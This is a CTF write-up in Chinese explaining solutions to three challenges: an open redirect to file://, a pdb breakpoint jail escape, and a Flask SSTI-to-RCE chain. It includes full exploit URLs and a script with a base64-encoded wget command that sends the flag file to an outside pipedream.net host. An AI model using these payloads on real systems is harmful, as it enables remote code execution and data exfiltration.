# cggc

## Preview Site 🔍

solve: 56/64


可以透過 `/logout` endpoint 來 open redirect
```
@app.route('/logout')
def logout():
    session.pop('username', None)
    next_url = request.args.get('next', url_for('index'))
    return redirect(next_url)
```

透過 open redirect to `file://` 讓系統 preview flag

payload: 
```
http://previewsite/logout?next=file:///flag
```

## Breakjail ⛓️

solve: 20/64

TL;DR;

1. 從給的 Dockerfile 發現這題是跑在 `Python 3.14.0a1` 最新版上
2. 發現最新版的 breakpoint 可以透過 commands arguments 來做到不進 interact 模式來下命令
3. 可以透過 j 來 jump 到 flag 被賦值的地方

首先題目會去讀 flag，存到一個變數後，將其覆蓋掉，之後拿使用者輸入看裡面確認裡面沒有包含 `.` `_` 以及長度沒超過 55 後，就拿去給了一個有自己 patch 過的 breakpoint 的環境下運行， `__builtins__` 是空的。

```python
#!/usr/local/bin/python3
print(open(__file__).read())

flag = open('flag').read()
flag = "Got eaten by the cookie monster QQ"

inp = __import__("unicodedata").normalize("NFKC", input(">>> "))

if any([x in "._." for x in inp]) or inp.__len__() > 55:
    print('bad hacker')
else:
    eval(inp, {"__builtins__": {}}, {
         'breakpoint': __import__('GoodPdb').good_breakpoint})

print(flag)
```

那我 breakpoint patch 的有兩處，目的就是讓 breakpoint 不會進互動模式來繞掉黑名單。


發現在 3.14.0a1 的版本有加上 commands 的 feature [#120255](https://github.com/python/cpython/pull/120255)

[cpython/Lib/pdb.py](https://github.com/python/cpython/blob/ed24702bd0f9925908ce48584c31dfad732208b2/Lib/pdb.py#L362)
```python
def set_trace(self, frame=None, *, commands=None):
    Pdb._last_pdb_instance = self
    if frame is None:
        frame = sys._getframe().f_back

    if commands is not None:
        self.rcLines.extend(commands)

    super().set_trace(frame)
```

```
breakpoint(commands=['n','n','j 1','j 4','c'])
```

之後去 [官方文件](https://docs.python.org/3/library/pdb.html#debugger-commands) 上面找有沒有可用的 debugger commands，可以用 `j` 來 jump 到 flag 被賦值的地方：

```
payload = "breakpoint(commands=['n','n','j 4','n','j 15','c'])"
print(payload)
```

有看到許多非預期解，大致都是用會影響 frame count 的語法，然後透過 `p *open(flag)` 去讀檔拿 flag


## Breakjail Online 🛜 

solve: 13/64

TL;DR;
1. 重用上一題的 commands arguments
2. 發現可以透過 request.query_string 來偷渡一些 payload 進去
3. 在 pdb 環境下 RCE


關鍵程式碼如下，使用者可以控制 q，並且跟前一題類似，有 `.` `_` `|` 的黑名單，所以 Jinja2 SSTI 常見的招都不太能用了，以及字數 88 的上限，之後頭尾加上 `{{` `}}` 後，就會拿去 render_template_string

將 request 的一系列參數都清空的，但觀察一下會發現 `query_string` 仍然是我們可以控制的部分
```python
@app.route('/SsTiMe', methods=['GET'])
def showip():
    # WOW! There has a SSTI in Flask!!!
    q = request.args.get('q', "'7'*7")

    # prevent smuggling bad payloads!
    request.args = {}
    request.headers = {}
    request.cookies = {}
    request.data = {}
    request.query_string = b"#"+request.query_string

    if any([x in "._.|||" for x in q]) or len(q) > 88:
        return "Too long for me :/ my payload less than 73 chars"

    res = render_template_string(f"{{{{{q}}}}}",
                                 # TODO: just for debugging, remove this in production
                                 breakpoint=breakpoint,
                                 str=str
                                 )

    # oops, I just type 'res' not res qq
    return 'res=7777777'

```

這題的預期解是：

```
 http://localhost:10003/SsTiMe?''.__class__.__base__.__subclasses__().__getitem__(123).load_module('os').system('echo'+chr(32)+'d2dldCBodHRwczovL2VveTgzd2ZtN2g2Ym9kYi5tLnBpcGVkcmVhbS5uZXQ/YT1gY2F0IC9mbGFnXypg'+chr(124)+'base64'+chr(32)+'-d'+chr(124)+'bash')&q=breakpoint(commands=%5Bstr(request%5B'query%5Cx5fstring'%5D)%5B3:229%5D%5D) 
```

分爲兩個部分

- 構造 RCE payload，這部分與 q 的長度無關，因此可以盡量塞
    - `?''.__class__.__base__.__subclasses__().__getitem__(123).load_module('os').system('echo'+chr(32)+'d2dldCBodHRwczovL2VveTgzd2ZtN2g2Ym9kYi5tLnBpcGVkcmVhbS5uZXQ/YT1gY2F0IC9mbGFnXypg'+chr(124)+'base64'+chr(32)+'-d'+chr(124)+'bash')` 
- q 的部分則是把 `request.query_string` 拿去 breakpoint commands 下運行，但不能用 `.`，所以用 `request['query_string']`代替，最後透過 str slice 把 RCE payload 的部分切出來
    - `&q=breakpoint(commands=[str(request['query\x5fstring'])[3:229]])`


完整 payload:

```python
import urllib.parse
import requests
import base64

target = "http://10.99.66.7:10003"

cmd = b'wget https://xxx.m.pipedream.net?a=`cat /flag_*`'
cmd = base64.b64encode(cmd).decode()

rce_exploit = f"''.__class__.__base__.__subclasses__().__getitem__(123).load_module('os').system('echo'+chr(32)+'{cmd}'+chr(124)+'base64'+chr(32)+'-d'+chr(124)+'bash')"

rce_exploit_len = len(rce_exploit)
print(rce_exploit_len)

payload = f"breakpoint(commands=[str(request['query\\x5fstring'])[3:229]])"

payload = f"{target}/SsTiMe?{rce_exploit}&q={payload}" 

r = requests.get(payload)

payload_len = len(payload)

print(f"{payload_len=}")
print(f"{payload=}")
print(r.url)
print(r.text)
```


這題由於沒注意到 breakpoint commands 的環境 `__builtins__` 跟 `__import__` 都活得好好的，因此存在直接 import os 來 RCE，搭配把 payload 慢慢存到本地來壓 q 長度的非預期解。


看到 @nella17 提到可以透過 format string 將 bytes 轉 str：
`a=b'c'; f'{c}'`

在 Discord 看到 @dalun 直接用 `request[a:b]` 來進一步縮減 payload 長度，類似：
`breakpoint(commands=[f'{{request}}'[40:-54]])`